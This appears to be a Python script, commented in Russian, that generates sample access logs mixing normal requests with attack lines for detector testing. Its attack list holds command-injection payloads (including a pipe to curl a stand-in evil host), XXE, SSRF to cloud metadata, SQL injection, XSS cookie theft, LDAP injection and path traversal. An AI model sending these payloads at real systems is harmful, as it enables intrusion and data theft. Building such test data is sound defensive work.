#!/usr/bin/env python3
"""
Генерация sample_access*.log — нормальный трафик + атаки (~1 к 17).

Примеры:
  python scripts/generate_sample_access_logs.py
  python scripts/generate_sample_access_logs.py --only 3 4 5
  python scripts/generate_sample_access_logs.py --lines 1000
"""
from __future__ import annotations

import argparse
import random
from datetime import datetime, timedelta
from pathlib import Path

# 1 атака на каждые NORMAL_PER_ATTACK нормальных строк (1:17)
NORMAL_PER_ATTACK = 17

ATTACKS = [
    ("GET", "/api/exec?cmd=1;cat%20/etc/passwd", "403", "curl/8.7.1"),
    ("GET", "/run?x=$(whoami)", "500", "-"),
    ("GET", "/shell?pipe=|curl%20evil.example/payload", "403", "python-requests/2.31.0"),
    (
        "POST",
        "/xml/import?body=%3C!DOCTYPE%20x%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%5D%3E",
        "400",
        "curl/8.7.1",
    ),
    ("POST", "/feed?data=%3C!ENTITY%20test%20PUBLIC%20%22http://evil%22%3E", "403", "-"),
    ("GET", "/fetch?url=http://127.0.0.1:8080/admin", "403", "sqlmap/1.8.3#stable"),
    ("GET", "/proxy?dest=file:///etc/passwd", "400", "Nikto/2.1.6"),
    ("GET", "/img?uri=http://169.254.169.254/latest/meta-data/", "403", "curl/8.7.1"),
    ("GET", "/ldap?user=*)(uid=*))(|(uid=*", "401", "gobuster/3.6"),
    ("GET", "/auth?cn=admin)(|(password=*", "403", "-"),
    ("GET", "/logout?redirect=http://evil-phish.example/login", "302", "Mozilla/5.0"),
    ("GET", "/go?next=http://attacker.tld/steal", "302", "Mozilla/5.0"),
    ("GET", "/search?q=%27%20OR%201%3D1--", "400", "sqlmap/1.8.3#stable"),
    ("GET", "/api/users?id=1%20UNION%20SELECT%20password%20FROM%20users", "403", "curl/8.7.1"),
    ("GET", '/search?q=%22%3E%3Csvg/onload=alert(1)%3E', "400", "Nikto/2.1.6"),
    ("GET", "/comment?text=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "403", "-"),
    ("GET", "/%2e%2e/%2e%2e/etc/passwd", "403", "zgrab/0.x"),
    ("GET", "/files?path=..%2F..%2Fwindows%2Fsystem32%2Fdrivers%2Fetc%2Fhosts", "403", "curl/8.7.1"),
    ("GET", "/.env", "404", "gobuster/3.6"),
    ("GET", "/.git/config", "403", "sqlmap/1.8.3#stable"),
    ("GET", "/wp-admin/install.php", "404", "wpscan/3.8"),
    ("GET", "/phpmyadmin/", "403", "Nikto/2.1.6"),
    ("TRACE", "/", "405", "curl/8.7.1"),
    ("DEBUG", "/api/test", "405", "-"),
    ("GET", "/robots.txt", "200", "sqlmap/1.8.3#stable"),
    ("GET", "/", "200", "-"),
    ("GET", "/admin", "403", "Nikto/2.1.6"),
    ("GET", "/search?q=" + "A" * 200, "414", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"),
    ("GET", "/api/filter?tags=" + "x" * 190, "400", "Mozilla/5.0"),
    (
        "GET",
        "/track?id=7hK9mP2qR8vL4nT6wY1zB5cD0fG3jH8kM2pQ9sU4xA7eW0rT5yI6oP1aS8dF4gH9jK2lZ6mN3bV7cX0qW5eR8tY2uI6oA9sD1fG4hJ7kL0zX3cV6bN9mM2pQ8rT5wE1yU4iO7aS0dF3gH6jK9lZ2",
        "200",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    ),
    ("GET", "/beacon?d=" + "%41%42%43%44" * 40, "200", "Mozilla/5.0"),
]

PATHS_NORMAL = [
    ("GET", "/"),
    ("GET", "/home"),
    ("GET", "/products"),
    ("GET", "/dashboard"),
    ("GET", "/static/styles.css"),
    ("GET", "/static/app.js"),
    ("GET", "/api/v1/items?page=1"),
    ("POST", "/login"),
    ("POST", "/api/v1/items"),
    ("GET", "/health"),
    ("GET", "/contact"),
    ("PUT", "/dashboard"),
    ("DELETE", "/logout"),
    ("GET", "/images/logo.png"),
    ("GET", "/reports/daily"),
    ("GET", "/favicon.ico"),
]

UAS_NORMAL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/125.0",
]

STATUSES = [200, 200, 200, 301, 302, 304, 403, 404, 500]


def generate_log(*, seed: int, total_lines: int, start: datetime) -> list[str]:
    rng = random.Random(seed)
    attack_every = NORMAL_PER_ATTACK + 1
    attacks = ATTACKS.copy()
    rng.shuffle(attacks)

    ips_normal = [f"192.168.{rng.randint(1, 3)}.{i}" for i in range(2, 90)]
    ips_normal += [f"10.0.{rng.randint(0, 2)}.{i}" for i in range(2, 60)]
    ips_attack = [f"203.0.113.{i}" for i in range(10, 30)] + [f"198.51.100.{i}" for i in range(50, 70)]

    lines: list[str] = []
    dt = start
    attack_i = 0

    for i in range(total_lines):
        dt += timedelta(seconds=rng.randint(3, 12))
        ts = dt.strftime("%d/%b/%Y:%H:%M:%S +0000")

        if i > 0 and i % attack_every == 0:
            method, path, status, ua = attacks[attack_i % len(attacks)]
            attack_i += 1
            ip = rng.choice(ips_attack)
            size = rng.randint(100, 9000)
            req = f'"{method} {path} HTTP/1.1"'
            lines.append(f'{ip} - - [{ts}] {req} {status} {size} "-" "{ua}"')
            continue

        method, path = rng.choice(PATHS_NORMAL)
        ip = rng.choice(ips_normal)
        ua = rng.choice(UAS_NORMAL)
        status = rng.choice(STATUSES)
        size = rng.randint(0, 15000)
        req = f'"{method} {path} HTTP/1.1"'
        lines.append(f'{ip} - - [{ts}] {req} {status} {size} "-" "{ua}"')

    return lines


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate sample access logs")
    parser.add_argument(
        "--only",
        type=int,
        nargs="*",
        help="Номера файлов (2–12). По умолчанию: 2..12",
    )
    parser.add_argument("--lines", type=int, default=1000, help="Строк в каждом файле")
    args = parser.parse_args()

    root = Path(__file__).resolve().parent.parent
    indices = args.only if args.only else list(range(3, 13))  # v3..v12 — ещё 10 файлов

    for n in indices:
        seed = 40 + n * 137
        start = datetime(2026, 4, n, 8, 0, 0)
        lines = generate_log(seed=seed, total_lines=args.lines, start=start)
        out = root / f"sample_access_v{n}.log"
        out.write_text("\n".join(lines) + "\n", encoding="utf-8")
        attacks = sum(1 for i in range(args.lines) if i > 0 and i % (NORMAL_PER_ATTACK + 1) == 0)
        print(f"{out.name}: {len(lines)} lines, ~{attacks} attack lines (1:{NORMAL_PER_ATTACK})")


if __name__ == "__main__":
    main()
